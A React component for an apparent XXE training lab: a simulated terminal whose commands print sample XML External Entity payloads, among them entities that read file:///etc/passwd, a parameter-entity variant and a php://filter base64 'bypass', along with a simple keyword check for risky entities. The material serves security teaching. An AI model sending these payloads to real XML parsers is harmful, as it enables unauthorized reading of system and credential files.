import React, { useState } from 'react';
import { Terminal as TerminalIcon, Play, Trash } from 'lucide-react';

interface XXELabTerminalProps {
  state: {
    currentInput: string;
    parsedOutput: any;
    lastAttempt: any;
    vulnerabilities: string[];
  };
  setState: (state: any) => void;
}

export function XXELabTerminal({ state, setState }: XXELabTerminalProps) {
  const [commands, setCommands] = useState<string[]>([]);
  const [currentCommand, setCurrentCommand] = useState('');

  const executeCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentCommand.trim()) return;

    const command = currentCommand.trim();
    setCommands([...commands, `$ ${command}`]);

    // Process XXE-related commands
    if (command === 'xxe generate basic') {
      setCommands(prev => [...prev,
        'Basic XXE Payloads:',
        '',
        '1. File Reading:',
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
        '<root>&xxe;</root>',
        '',
        '2. Basic Entity Test:',
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<!DOCTYPE test [ <!ENTITY test "XXE Test"> ]>',
        '<root>&test;</root>'
      ]);
    } else if (command === 'xxe bypass filters') {
      setCommands(prev => [...prev,
        'Filter Bypass Techniques:',
        '',
        '1. Parameter Entities:',
        '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>',
        '',
        '2. UTF-16 Encoding:',
        '<?xml version="1.0" encoding="UTF-16"?>',
        '',
        '3. Base64 Encoding:',
        '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd"> ]>'
      ]);
    } else if (command === 'help') {
      setCommands(prev => [...prev,
        'Available commands:',
        '  xxe generate basic   - Generate basic XXE payloads',
        '  xxe bypass filters   - Show filter bypass techniques',
        '  xxe analyze         - Analyze current payload',
        '  clear              - Clear terminal',
        '  help               - Show this help message'
      ]);
    } else if (command === 'clear') {
      setCommands([]);
    } else if (command === 'xxe analyze') {
      if (state.currentInput) {
        setCommands(prev => [...prev,
          'Analyzing current payload:',
          `Input: ${state.currentInput}`,
          'Analysis:',
          '- External entities: ' + (state.currentInput.includes('SYSTEM') ? 'Detected' : 'Not found'),
          '- Custom entities: ' + (state.currentInput.includes('<!ENTITY') ? 'Detected' : 'Not found'),
          '- File access: ' + (state.currentInput.includes('file:///') ? 'Detected' : 'Not found'),
          '- Network access: ' + (state.currentInput.includes('http://') ? 'Detected' : 'Not found')
        ]);
      } else {
        setCommands(prev => [...prev, 'No payload available for analysis']);
      }
    } else {
      setCommands(prev => [...prev, 'Command not found. Type "help" for available commands']);
    }

    setCurrentCommand('');
  };

  return (
    <div className="bg-gray-950 rounded-lg p-4 font-mono text-sm">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-2">
          <TerminalIcon className="w-4 h-4 text-green-400" />
          <span className="text-green-400">XXE Testing Terminal</span>
        </div>
        <button
          onClick={() => setCommands([])}
          className="text-gray-500 hover:text-gray-400"
        >
          <Trash className="w-4 h-4" />
        </button>
      </div>

      <div className="h-80 overflow-y-auto mb-4 space-y-1">
        {commands.map((cmd, i) => (
          <div key={i} className="text-gray-300 whitespace-pre-wrap">{cmd}</div>
        ))}
      </div>

      <form onSubmit={executeCommand} className="flex gap-2">
        <span className="text-green-400">$</span>
        <input
          type="text"
          value={currentCommand}
          onChange={(e) => setCurrentCommand(e.target.value)}
          className="flex-1 bg-transparent focus:outline-none text-gray-300"
          placeholder="Type 'help' for available commands..."
        />
        <button type="submit" className="text-green-400">
          <Play className="w-4 h-4" />
        </button>
      </form>
    </div>
  );
}